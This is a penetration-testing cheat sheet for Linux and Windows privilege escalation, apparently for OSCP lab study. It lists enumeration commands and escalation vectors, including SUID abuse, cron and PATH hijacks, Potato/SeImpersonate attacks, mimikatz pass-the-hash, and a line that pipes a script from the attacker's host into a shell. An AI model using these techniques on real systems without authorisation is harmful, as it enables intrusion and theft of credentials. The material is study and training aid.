# Notes — Privilege Escalation

> Authorized lab/OSCP use only.

---

## Linux

### Quick wins
```bash
id; sudo -l
uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null      # SUID
getcap -r / 2>/dev/null                      # capabilities
cat /etc/crontab; ls -la /etc/cron.*
```

### Automated
```bash
# host linpeas from attacker: python3 -m http.server 80
curl http://<you>/linpeas.sh | sh
```

### Vectors
| Vector | Check | Exploit |
|--------|-------|---------|
| sudo | `sudo -l` | GTFOBins entry for the allowed binary |
| SUID | `find / -perm -4000` | GTFOBins SUID section |
| Capabilities | `getcap -r /` | `cap_setuid+ep` on python/perl → `os.setuid(0)` |
| Cron | writable script run by root | inject commands |
| PATH hijack | relative binary in root script | plant malicious binary earlier in PATH |
| Writable /etc/passwd | `ls -l /etc/passwd` | add root-UID user with known hash |
| NFS | `cat /etc/exports` | `no_root_squash` → SUID binary from client |
| Creds reuse | configs, history, `.ssh`, DB | log in as higher-priv user |
| Kernel | `uname -r` + searchsploit | DirtyCow/overlayfs (last resort) |

### GTFOBins reflex
For any SUID/sudo binary, check GTFOBins before anything else — most easy Linux privescs are one-liners from there.

---

## Windows

### Quick wins
```cmd
whoami /priv
whoami /all
systeminfo
cmdkey /list
net users
```

### Automated
```cmd
winPEASx64.exe
```
WES-NG / Watson against `systeminfo` to find missing patches.

### Vectors
| Vector | Check | Exploit |
|--------|-------|---------|
| Token privs | `whoami /priv` SeImpersonate/SeAssignPrimaryToken | PrintSpoofer / Potato → SYSTEM |
| Service perms | `accesschk.exe -uwcqv user *` | reconfigure service binPath |
| Unquoted path | `wmic service get name,pathname` | plant exe in a space-gap path |
| AlwaysInstallElevated | `reg query HKLM\...\Installer /v AlwaysInstallElevated` | malicious MSI |
| Stored creds | `cmdkey /list`, Unattend.xml, registry | `runas` / reuse |
| Scheduled tasks | `schtasks /query /fo LIST /v` | writable task binary |
| Missing patch | `systeminfo` + WES-NG | local kernel exploit |
| Hashes | SAM/mimikatz | pass-the-hash to admin |

### SeImpersonate note
If `whoami /priv` shows **SeImpersonatePrivilege** (common for service accounts, e.g. MSSQL `xp_cmdshell`), Potato-family / PrintSpoofer attacks escalate to SYSTEM — a frequent OSCP pattern.

---

## General Tips
- Always run `sudo -l` (Linux) / `whoami /priv` (Windows) first — cheapest wins.
- Verify every automated finding manually before exploiting.
- Capture proof: screenshot `id`/`whoami` **and** the target IP together.
- Reuse is king: passwords found in one place often unlock another.
